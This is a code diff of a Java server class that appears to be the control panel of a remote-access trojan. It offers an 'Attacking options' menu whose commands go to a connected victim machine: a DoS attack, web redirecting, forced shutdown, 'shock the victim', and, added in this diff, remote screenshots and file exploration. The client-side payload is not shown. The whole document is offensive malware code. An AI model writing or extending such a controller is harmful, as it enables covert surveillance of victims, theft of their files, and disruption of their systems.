@@ -26,7 +26,7 @@ public class Server {
 		try{
 			ss = new ServerSocket(port);
 			s = ss.accept();
-			System.out.println("Connection established with client at port :"+port);
+			JOptionPane.showMessageDialog(j, "Connection established with client at port :"+port);
 			
 			int option=optionForAttacking(j);
 			
@@ -34,12 +34,12 @@ public class Server {
 			dout = new DataOutputStream(s.getOutputStream());
 			br = new BufferedReader(new InputStreamReader(System.in));
 			
-			while(option<7){
+			while(option<9){
 				
 				if(option == 1){
 					dout.writeUTF("dos");
 					recive = din.readUTF();
-					System.out.println(recive);
+					JOptionPane.showMessageDialog(j, recive);
 				}
 				
 				if(option== 2){
@@ -49,7 +49,7 @@ public class Server {
 				if(option == 3){
 					dout.writeUTF("shut");
 					recive = din.readUTF();
-					System.out.println(recive);
+					JOptionPane.showMessageDialog(j, recive);
 				}
 				
 				if(option == 4){
@@ -63,50 +63,81 @@ public class Server {
 							send = JOptionPane.showInputDialog(j,temp);
 							dout.writeUTF(send);
 							recive = din.readUTF();
+							if(recive.equals("stop")){
+								JOptionPane.showMessageDialog(j, "chat ended..");
+								break;
+							}
 						}
 						
-						recive = din.readUTF();
-						System.out.println("chat ended ..!..");
+						
 					}
 					catch (Exception e){
-						System.out.println("chat ended !");
+
+						
 					}
 				}
 				
 				if(option == 5){
 					dout.writeUTF("shock");
 					recive = din.readUTF();
-					System.out.println(recive);
+					JOptionPane.showMessageDialog(j, recive);
 				}
 				
 				if(option == 6){
 					dout.writeUTF("light");
 					recive = din.readUTF();
-					System.out.println(recive);
+					JOptionPane.showMessageDialog(j, recive);
 				}
+				
+				if(option == 7){
+					send = ao.screenshot(j);
+					dout.writeUTF(send);
+					recive = din.readUTF();
+					JOptionPane.showMessageDialog(j, recive);
 					
+				}
+				if(option == 8){
+					send = ao.fileExplore(j);
+					dout.writeUTF(send);
+					recive = din.readUTF();
+					JOptionPane.showMessageDialog(j, recive);
 					
+				}
+				
+
 				
 				option = optionForAttacking(j);
 			}
 			
 			s.close();
 			ss.close();
+			
+			JOptionPane.showMessageDialog(j, "SEE YOU !!");
+			System.exit(0);
 
 			
 		}
 		catch(Exception e){
-			System.out.println("Error accured in connection..");
-			System.out.println(e.getMessage());
+			JOptionPane.showMessageDialog(j, "SEE YOU !!");
+			System.exit(0);
 		}
 	}
 	
-	public static int optionForAttacking(JFrame j) throws IOException{
-		
-		String option="";
-		String options = "\nAttacking options:\n1: Dos Attack\n2: Web redirecting\n3: Shutdown the system\n4: chat with client\n5: Shock the victim\n6: Fun light script\nEnter your choise:\n";
-		option = JOptionPane.showInputDialog(j,options);
-		return Integer.parseInt(option);
+	public static int optionForAttacking(JFrame j){
+		int choise = 0;
+		try{
+			String option="";
+			String options = "\nAttacking options:\n\n1: Dos Attack\n2: Web redirecting\n3: Shutdown the system\n4: chat with client\n5: Shock the victim\n6: Fun light script\n7: take screenshot\n8: file exploration\n\nEnter your choise:\n";
+			option = JOptionPane.showInputDialog(j,options);
+			choise= Integer.parseInt(option);
+		}
+		catch (Exception e){
+			String ch = JOptionPane.showInputDialog(j, "You Entered the wrong option:\n\n1.main menu\n2.exit");
+			if(ch.equals("1")) return optionForAttacking(j);
+			else return 10;
+			
+		}
+		return choise;
 	}
 	
 
